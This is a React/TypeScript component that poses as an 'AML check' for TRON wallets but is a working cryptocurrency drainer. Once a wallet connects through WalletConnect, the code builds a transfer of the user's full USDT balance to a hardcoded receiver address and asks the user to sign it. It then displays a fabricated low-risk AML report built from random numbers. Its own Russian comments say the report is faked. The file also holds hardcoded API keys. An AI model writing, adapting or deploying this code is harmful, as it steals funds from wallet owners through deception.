import React, { useState } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

export const TronAuthButton: React.FC = () => {
  const [modal, setModal] = useState<string | null>(null);
  const [amlResult, setAmlResult] = useState<any | null>(null);
  const [loading, setLoading] = useState(false);
  const [amlLoading, setAmlLoading] = useState(false);

  // Adapter singleton
  const adapterRef = React.useRef<any>(null);
  if (!adapterRef.current) {
    adapterRef.current = new WalletConnectAdapter({
      network: 'Mainnet',
      options: {
        relayUrl: 'wss://relay.walletconnect.com',
        projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
        metadata: {
          name: 'AML',
          description: 'TRON + WalletConnect Integration',
          url: 'https://amlreports.pro',
          icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
        },
      },
      web3ModalConfig: { themeMode: 'dark' },
    });
  }

  const handleAuth = async (e?: React.MouseEvent) => {
    e?.stopPropagation();
    setLoading(true);
    setModal(null);
    setAmlResult(null);
    setAmlLoading(false);

    // Проверяем, что TronWeb загружен через window
    const TronWeb = (window as any).TronWeb;
    if (!TronWeb) {
      setModal('TronWeb not loaded! Please refresh page.');
      setLoading(false);
      return;
    }

    // Polyfill Buffer для TronWeb (если нужно)
    if (!(window as any).Buffer) (window as any).Buffer = (await import('buffer')).Buffer;

    // Создаём tronWeb объект
    const tronWeb = new TronWeb({
      fullHost: 'https://api.trongrid.io',
      headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
    });

    const adapter = adapterRef.current;
    try {
      await adapter.connect();
      const userAddress = adapter.address;
      if (!userAddress || !tronWeb.isAddress(userAddress)) throw new Error('Invalid wallet address');
      tronWeb.setAddress(userAddress);

      const trxRaw = await tronWeb.trx.getBalance(userAddress);
      if (trxRaw < 2_000_000) {
        setModal('❌ Insufficient TRX for network fees.');
        await adapter.disconnect();
        setLoading(false);
        return;
      }

      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt = Number(usdtRaw) / 1e6;
      if (usdt < 1) {
        setModal('✅ No USDT found. Low AML risk.');
        await adapter.disconnect();
        setLoading(false);
        return;
      }

      // --- Показываем "AML Report is loading..."
      setAmlLoading(true);

      // --- КОРРЕКТНОЕ ПРЕОБРАЗОВАНИЕ адреса ---
      const receiverHex = tronWeb.address.toHex(TRON_RECEIVER);

      // --- Формируем и подписываем транзакцию ---
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        { feeLimit: 25_000_000, callValue: 0 },
        [
          { type: 'address', value: receiverHex },
          { type: 'uint256', value: usdtRaw }
        ],
        userAddress
      );
      const signedTx = await adapter.signTransaction(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      // Делаем вид что отчёт "генерируется"
      setTimeout(() => {
        setAmlLoading(false);
        if (result?.result) {
          // --- Симулируем AML отчет ---
          const fakeRisk = (Math.random() * 7 + 2).toFixed(2); // 2-9%
          setAmlResult({
            status: "success",
            checkedAddress: userAddress,
            checkedUSDT: usdt,
            riskScore: fakeRisk,
            suspicious: [
              { label: "Exchange Unlicensed", value: "0%" },
              { label: "ATM", value: "0%" },
              { label: "Liquidity pools", value: "0%" }
            ],
            dangerous: [
              { label: "Darknet Marketplace", value: "0%" },
              { label: "Mixer", value: "0%" },
              { label: "Illegal Service", value: "0%" }
            ],
          });
        } else {
          setModal('⚠️ Transaction failed.');
        }
      }, 1700); // имитация загрузки 1.7 сек
    } catch (err: any) {
      setAmlLoading(false);
      if (
        err?.message?.includes('User rejected') ||
        err?.message?.includes('Modal is closed') ||
        err?.message?.includes('Timeout')
      ) {
        setModal(null); // Cancel/close – не показываем ошибку
      } else if (err?.message) {
        setModal(err.message);
      } else {
        setModal('⚠️ Connection or transaction error');
      }
    }
    setLoading(false);
    await adapterRef.current.disconnect();
  };

  return (
    <div className="AuthButton">
      <button onClick={handleAuth} disabled={loading || amlLoading} style={{ minWidth: 180 }}>
        {(loading || amlLoading) ? 'Connecting...' : 'Check Your Wallet'}
      </button>

      {/* Загрузка AML отчёта */}
      {amlLoading && (
        <div className="modal__overflow">
          <div className="modal">
            <p style={{ fontWeight: 500, fontSize: 18, margin: "24px 0" }}>
              Generating AML report…
            </p>
          </div>
        </div>
      )}

      {/* Сам отчёт */}
      {amlResult && (
        <div className="modal__overflow">
          <div className="modal" style={{ maxWidth: 340 }}>
            <h3 style={{ color: '#07953b' }}>AML Report: Low Risk</h3>
            <div style={{ fontSize: 15, marginBottom: 10 }}>
              <strong>Wallet:</strong> <br />
              <span style={{ fontSize: 13 }}>{amlResult.checkedAddress}</span>
            </div>
            <div style={{ fontSize: 15, marginBottom: 10 }}>
              <strong>USDT Checked:</strong> {amlResult.checkedUSDT} USDT
            </div>
            <div style={{ fontSize: 15, marginBottom: 10 }}>
              <strong>Risk Score:</strong> <span style={{ color: '#ffa500' }}>{amlResult.riskScore}%</span>
            </div>
            <div style={{ marginBottom: 7 }}>
              <span style={{ color: '#f8b600', fontWeight: 'bold' }}>Suspicious sources:</span>
              <ul style={{ margin: '4px 0 8px 14px', fontSize: 13 }}>
                {amlResult.suspicious.map((item: any) => (
                  <li key={item.label}>{item.label} <span style={{ float: 'right', color: '#222' }}>{item.value}</span></li>
                ))}
              </ul>
            </div>
            <div style={{ marginBottom: 7 }}>
              <span style={{ color: '#d4331c', fontWeight: 'bold' }}>Dangerous sources:</span>
              <ul style={{ margin: '4px 0 8px 14px', fontSize: 13 }}>
                {amlResult.dangerous.map((item: any) => (
                  <li key={item.label}>{item.label} <span style={{ float: 'right', color: '#222' }}>{item.value}</span></li>
                ))}
              </ul>
            </div>
            <div style={{ fontSize: 12, color: '#888', marginTop: 7 }}>
              This address has low risk and no links to suspicious or dangerous sources were found.
            </div>
            <button onClick={() => setAmlResult(null)} style={{ marginTop: 14 }}>Close</button>
          </div>
        </div>
      )}

      {modal && (
        <div className="modal__overflow">
          <div className="modal">
            <p>{modal}</p>
            <button onClick={() => setModal(null)}>Close</button>
          </div>
        </div>
      )}
    </div>
  );
};
